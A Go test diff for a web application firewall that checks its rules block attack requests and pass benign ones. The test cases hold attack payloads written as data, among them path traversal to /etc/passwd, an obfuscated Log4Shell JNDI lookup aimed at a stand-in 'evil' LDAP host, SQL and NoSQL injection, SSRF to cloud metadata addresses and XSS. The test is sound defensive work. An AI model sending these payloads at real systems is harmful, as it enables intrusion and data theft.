@@ -3,6 +3,7 @@ package defaults
 import (
 	"bufio"
 	"net/http/httptest"
+	"net/url"
 	"os"
 	"path/filepath"
 	"strings"
@@ -58,6 +59,57 @@ func TestBenignCorpusAllowed(t *testing.T) {
 				t.Errorf("%s: false positive for %q (matches=%v)", filepath.Base(f), line, ids)
 			}
 		}
+	}
+}
+
+// Exercise the rules added from txsp2 through the request engine, including
+// their target selection and transforms (not just regexp compilation).
+func TestCuratedRules(t *testing.T) {
+	e := newEngine(t)
+	cases := []struct {
+		name, method, path, body, header, value, ruleID string
+		block                                           bool
+	}{
+		{"body traversal", "POST", "/", "../../etc/passwd", "", "", "body-sensitive-path", true},
+		{"obfuscated jndi", "GET", "/?q=%24%7B%24%7Blower%3Aj%7Dndi%3Aldap%3A%2F%2Fevil%7D", "", "", "", "log4shell-jndi", true},
+		{"sensitive internals", "GET", "/WEB-INF/web.xml", "", "", "", "sensitive-files", true},
+		{"sql file", "GET", "/?q=load_file%28%27%2Fetc%2Fpasswd%27%29", "", "", "", "sqli-primitives", true},
+		{"nosql json", "POST", "/", `{"$ne":null}`, "", "", "nosql-operator-injection", true},
+		{"nosql form", "GET", "/?user%5B%24ne%5D=x", "", "", "", "nosql-operator-injection", true},
+		{"ssrf query", "GET", "/?url=http%3A%2F%2F169.254.169.254%2Flatest", "", "", "", "ssrf-private-url", true},
+		{"ssrf body", "POST", "/", `{"url":"http://localhost/admin"}`, "", "", "ssrf-private-url", true},
+		{"serialized", "POST", "/", "rO0ABpayload", "", "", "java-serialized-object", true},
+		{"double encoded", "GET", "/?q=%253C", "", "", "", "double-encoded-metachar", true},
+		{"srcdoc", "POST", "/", `<iframe srcdoc="hello">`, "", "", "xss-iframe-srcdoc", true},
+		{"crlf header", "GET", "/", "", "X-Test", "a%0d%0ab", "crlf-header", false},
+		{"seo crawler", "GET", "/", "", "User-Agent", "AhrefsBot/7", "commercial-crawlers", true},
+		{"ai crawler", "GET", "/", "", "User-Agent", "GPTBot/1", "ai-training-crawlers", true},
+		{"benign prose", "POST", "/", "select a book from the list; please confirm (by clicking)", "", "", "", false},
+		{"benign referer", "GET", "/", "", "Referer", "http://nas.local/app", "", false},
+		{"benign nested URL", "GET", "/?next=" + url.QueryEscape("https://example.com/a%252Fb"), "", "", "", "", false},
+		{"benign netmask", "GET", "/?mask=255.255.255.0", "", "", "", "", false},
+		{"benign encoded newline", "GET", "/", "", "X-Test", "a%0ab", "", false},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			r := httptest.NewRequest(tc.method, "http://example.com"+tc.path, strings.NewReader(tc.body))
+			if tc.header != "" {
+				r.Header.Set(tc.header, tc.value)
+			}
+			d := e.EvaluateDebug(e.NewContext(r))
+			if d.Blocked != tc.block {
+				t.Errorf("blocked=%v, want %v (matches=%v)", d.Blocked, tc.block, d.Matches)
+			}
+			if tc.ruleID != "" {
+				found := false
+				for _, m := range d.Matches {
+					found = found || m.RuleID == tc.ruleID
+				}
+				if !found {
+					t.Errorf("missing match %s (matches=%v)", tc.ruleID, d.Matches)
+				}
+			}
+		})
 	}
 }
 
